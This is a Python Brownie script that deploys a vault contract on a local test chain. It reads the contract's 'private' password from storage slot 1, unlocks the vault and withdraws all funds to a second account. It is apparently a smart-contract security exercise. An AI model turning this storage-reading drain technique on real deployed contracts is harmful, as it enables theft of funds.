from brownie import accounts, ColdStorageVault  
from web3 import Web3
import re

web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))

account0 = accounts[0]
account1 = accounts[1]

def deploy_cold_storage():
    storage = ColdStorageVault.deploy("test1",{"from": account0, "value": 3000000000000000000})
    return storage

def get_password(storage):
    """Get the private variable password from memory and set it to a return variable"""
    contract_address = str(storage)
    password = web3.eth.getStorageAt(contract_address, 1).decode() #decode converts from bytes to string
    password = re.sub('[^0-9a-zA-Z]','',password)
    print (f'Password: {password}')  
    return password

def unlock_and_withdraw(password, storage):
    """Unlock the contract with the password and withdraw all the funds to attacks account"""
    is_locked = storage.is_locked() #grab is_locked Value
    if is_locked:
        print (f'Locked: {is_locked} preparing to unlock...')
    #     is_locked = storage.is_locked()
        storage.unlock(password,{"from": account1})
        is_locked = storage.is_locked()
        print(is_locked)


        #If wrong password and still locked 
        if is_locked:
            print("incorrect password sent")
        else:
            print(f"Contract Unlocked...")
            print(f'Starting Balance: {account1.balance()} ')
            print("Withdrawing all funds")
            storage.WithdrawAll({"from": account1})
            print(f'Balance after attack: {account1.balance()}')


def main():
    storage = deploy_cold_storage()
    password = get_password(storage)
    unlock_and_withdraw(password, storage)
